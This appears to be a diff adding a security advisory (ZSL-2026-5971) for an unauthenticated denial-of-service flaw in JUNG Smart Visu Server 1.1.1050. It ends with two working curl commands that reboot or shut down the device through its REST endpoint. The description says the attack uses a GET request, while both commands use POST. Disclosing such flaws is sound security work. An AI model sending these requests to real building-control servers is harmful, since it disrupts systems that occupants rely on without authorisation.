@@ -1,0 +1,45 @@
+
+JUNG Smart Visu Server 1.1.1050 Remote Server Shutdown
+
+
+Vendor: ALBRECHT JUNG GMBH & CO. KG
+Product web page: https://www.jung-group.com | https://www.jung.de
+Affected version: 1.1.1050
+
+Summary: The Smart Visu Server makes your intelligent building
+control convenient. With the user-friendly operating concept,
+you can control both the KNX system and other systems such as
+Philips Hue or Sonos on your mobile devices. You can likewise
+connect voice control to your KNX system with Amazon Alexa or
+Google Assistant via the Smart Visu Server.
+
+Desc: The device is suffering from a Denial of Service (DoS).
+An unauthenticated attacker can reboot or shutdown the server
+by sending one GET request.
+
+Tested on: Jetty(9.2.12.v20150709)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5971
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5971.php
+
+
+07.02.2026
+
+--
+
+
+# Reboot server
+$ curl -X POST "http://10.0.0.16:8080/rest/items/liteserver_LiteServer_1_systemControl" \
+ -H "User-Agent: thricer-engine/1.6" \
+ -d "{\"MSG_ID_TYPE\":\"MSG_REBOOT_REQ\"}"
+
+
+# Shutdown server
+$ curl -X POST "http://10.0.0.16:8080/rest/items/liteserver_LiteServer_1_systemControl" \
+ -H "User-Agent: thricer-engine/1.6" \
+ -d "{\"MSG_ID_TYPE\":\"MSG_HALT_REQ\"}"
